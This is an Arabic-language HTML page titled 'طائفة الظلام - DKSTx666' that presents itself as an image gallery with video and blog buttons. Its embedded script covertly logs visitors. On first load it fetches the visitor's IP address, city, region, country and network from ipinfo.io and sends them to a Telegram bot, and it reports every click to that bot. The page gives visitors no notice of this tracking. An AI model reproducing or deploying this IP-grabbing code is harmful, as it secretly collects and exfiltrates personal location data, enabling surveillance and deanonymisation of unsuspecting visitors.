<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>طائفة الظلام - DKSTx666</title>
  <style>
    body {
      margin: 0;
      font-family: 'Arial', sans-serif;
      background: radial-gradient(circle, pink 10%, #ffe6f0);
      color: #333;
      overflow-x: hidden;
    }

    header {
      text-align: center;
      padding: 10px;
      background: url('glow-cover.jpg') center/cover no-repeat;
      height: 180px;
    }

    .profile {
      width: 120px;
      height: 120px;
      border-radius: 50%;
      border: 5px solid white;
      margin: -60px auto 20px;
      animation: pulse-purple 2s infinite;
    }

    @keyframes pulse-purple {
      0% { box-shadow: 0 0 0 0 rgba(128,0,128, 0.5); }
      70% { box-shadow: 0 0 0 15px rgba(128,0,128, 0); }
      100% { box-shadow: 0 0 0 0 rgba(128,0,128, 0); }
    }

    .gallery {
      display: grid;
      grid-template-columns: repeat(5, 1fr);
      gap: 10px;
      padding: 20px;
    }

    .gallery img {
      width: 100%;
      border-radius: 12px;
      cursor: pointer;
      transition: transform 0.3s ease;
    }

    .gallery img:hover {
      transform: scale(1.05);
    }

    .floating-btn {
      position: fixed;
      bottom: 15px;
      width: 50px;
      height: 50px;
      font-size: 22px;
      border-radius: 50%;
      text-align: center;
      line-height: 50px;
      color: white;
      cursor: pointer;
      font-weight: bold;
    }

    .video-btn {
      right: 15px;
      background: #ff0066;
    }

    .blog-btn {
      left: 15px;
      background: yellow;
      color: black;
      animation: pulse-yellow 1.5s infinite;
    }

    @keyframes pulse-yellow {
      0% { box-shadow: 0 0 0 0 rgba(255, 255, 0, 0.7); }
      70% { box-shadow: 0 0 0 12px rgba(255, 255, 0, 0); }
      100% { box-shadow: 0 0 0 0 rgba(255, 255, 0, 0); }
    }

    .pagination {
      position: fixed;
      bottom: 10px;
      left: 50%;
      transform: translateX(-50%);
      display: flex;
      gap: 10px;
    }

    .pagination button {
      background: purple;
      color: white;
      border: none;
      border-radius: 8px;
      padding: 5px 12px;
      cursor: pointer;
      box-shadow: 0 0 8px violet;
      transition: transform 0.3s ease;
    }

    .pagination button:hover {
      transform: scale(1.2);
    }
  </style>
</head>
<body>

  <header>
    <img class="profile" src="profile.jpg" alt="صورة بروفايل">
  </header>

  <section class="gallery">
    <img src="20250502_015045.png" onclick="notifyVisit('صورة 1')" />
    <img src="20250502_015045.png" onclick="notifyVisit('صورة 2')" />
    <img src="20250502_015045.png" onclick="notifyVisit('صورة 3')" />
    <img src="20250502_015045.png" onclick="notifyVisit('صورة 4')" />
    <img src="20250502_015045.png" onclick="notifyVisit('صورة 5')" />
  </section>

  <div class="floating-btn video-btn" onclick="openVideo()">
    🎥
  </div>

  <div class="floating-btn blog-btn" onclick="openBlog()">
    📖
  </div>

  <div class="pagination">
    <button onclick="notifyVisit('الصفحة 1')">1</button>
    <button onclick="notifyVisit('الصفحة 2')">2</button>
    <button onclick="notifyVisit('الصفحة 3')">3</button>
    <button onclick="notifyVisit('الصفحة 4')">4</button>
    <button onclick="notifyVisit('الصفحة 5')">5</button>
  </div>

  <script>
    const TOKEN = "👑"; // ضع توكن بوتك هنا
    const CHAT_ID = "👑"; // معرف شاتك

    function sendMessage(text) {
      fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chat_id: CHAT_ID, text })
      });
    }

    function notifyVisit(action) {
      sendMessage(`📌 المضيف دخل إلى: ${action}`);
    }

    function openVideo() {
      notifyVisit("زر الفيديو");
      window.location.href = "video.html";
    }

    function openBlog() {
      notifyVisit("زر المدونات 📖");
      window.location.href = "index.html";
    }

    // إرسال بيانات الزائر أول مرة فقط
    if (!localStorage.visited) {
      localStorage.visited = "true";
      fetch("https://ipinfo.io/json?token=ce4d6a5d55b4b9").then(res => res.json()).then(data => {
        let message = `🧠 زائر جديد دخل الموقع\n🌐 IP: ${data.ip}\n📍 المدينة: ${data.city}\n📱 المنطقة: ${data.region}\n🛰️ البلد: ${data.country}\n🌍 الشبكة: ${data.org}`;
        sendMessage(message);
      });
    }
  </script>

</body>
</html>
